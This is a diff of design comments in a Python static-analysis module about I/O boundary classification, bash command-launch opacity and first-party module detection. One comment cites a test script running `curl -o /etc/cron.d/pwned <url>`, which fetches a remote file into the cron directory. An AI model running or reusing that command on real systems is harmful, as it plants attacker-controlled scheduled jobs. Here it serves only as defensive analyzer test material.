@@ -42,7 +42,9 @@ Beyond the catalogue itself, this module owns the whole ADR-0016 pipeline:
 - **The boundary map.** ``compute_boundary_map`` assembles the wire artifact
   versioned by ``IO_BOUNDARIES_SCHEMA_VERSION``, with ``compute_leaf_rollups``
   aggregating chains per leaf and ``_compute_external_potential`` synthesizing
-  the opt-in external-potential bucket.
+  the disclosed-only external-potential bucket when node data is supplied (the
+  CLI hides its per-call listing from text output unless
+  ``--show-external-potential``).
 - **Untraced calls are I/O unknown, not no I/O (WI-pogar, ADR-0016 §7).** An
   ``external_potential`` chain is a call into a named module whose source was
   not analysed -- installed dependency source is not parsed by default -- and
@@ -72,7 +74,8 @@ Beyond the catalogue itself, this module owns the whole ADR-0016 pipeline:
   same-named definition in another file (a platform shim) and stays catalogued.
 - **First-party detection.** ``is_definitionally_first_party`` answers, from
   each language's resolution rules in ``FIRST_PARTY_MODULE_GRAMMARS`` (Rust's
-  ``crate``/``super``/``self``, JS/TS relative specifiers), whether a module
+  ``crate``/``super``/``self``; relative specifiers in JS/TS, Python, and quoted
+  C/C++/ObjC includes), whether a module
   reference names this repository, which lets ``verify-claims``' coverage gate
   stop reporting it as an unexamined dependency. A relative specifier counts
   only when it lands on source the analysis read: one through ``node_modules``
@@ -328,9 +331,11 @@ OPAQUE_BOUNDARIES: frozenset[str] = opacity_names(catalog_declarable=True)
 # channel (INV-larol). A boundary here is SYNTHESISED BY A PRODUCER rather than
 # declared by a catalogue, so ``declares_opaque_crossing`` can never see it: the
 # bash analyzer stamps ``meta.io_boundary = "command_launch"`` directly on an
-# external-command edge (bash.py, WI-javoh) because there is no bash catalogue
-# to match against and, per ADR-0016's implementation note, there is not going
-# to be one — cataloguing ``curl`` as ``net_send`` would attribute curl's
+# external-command edge (bash.py, WI-javoh) because no catalogue describes
+# external commands: ``io_primitives/bash.yaml`` (INV-vavup) catalogues only
+# the shell's own surface (redirection, environment and host-info expansions)
+# and models no command rows, and per ADR-0016's implementation note it is not
+# going to — cataloguing ``curl`` as ``net_send`` would attribute curl's
 # network activity to the shell script, and no clean invariant separates
 # ``curl`` from ``git``.
 #
@@ -343,10 +348,16 @@ OPAQUE_BOUNDARIES: frozenset[str] = opacity_names(catalog_declarable=True)
 # collapsing them into a single set makes one half unreachable whichever way it
 # is spelled.
 #
-# WHY THIS WAS NOT LIVE WHEN IT WAS WRITTEN, and what arms it. bash ships no
-# catalogue, so ``_external_call_sites`` drops its edges on ``catalog is None``
-# and the INV-dabov language gate answers first. The hole is held shut by the
-# ABSENCE OF ONE FILE that three places in this tree recommend adding. Measured
+# WHY THIS WAS NOT LIVE WHEN IT WAS WRITTEN, and what keeps it shut now. When
+# this was written bash shipped no catalogue, so ``_external_call_sites``
+# dropped its edges on ``catalog is None`` and the INV-dabov language gate
+# answered first. ``io_primitives/bash.yaml`` now ships (redirection,
+# environment and host-info rows, no command rows), so that guard is gone;
+# command launches stay opaque because verify_claims asks the producer stamp
+# FIRST (``_is_producer_stamped_launch``, asked by ``_opaque_launch_sites``
+# and by ``_adjudicate_external_modules``, which backs
+# ``_uncatalogued_external_modules``), even when a catalogue row would also
+# classify the call. The history that motivated that order, measured
 # on the shipped CLI over a two-line script whose only command is
 # ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
 # filesystem": with no bash.yaml, ``inconclusive`` rc 2; with a six-line
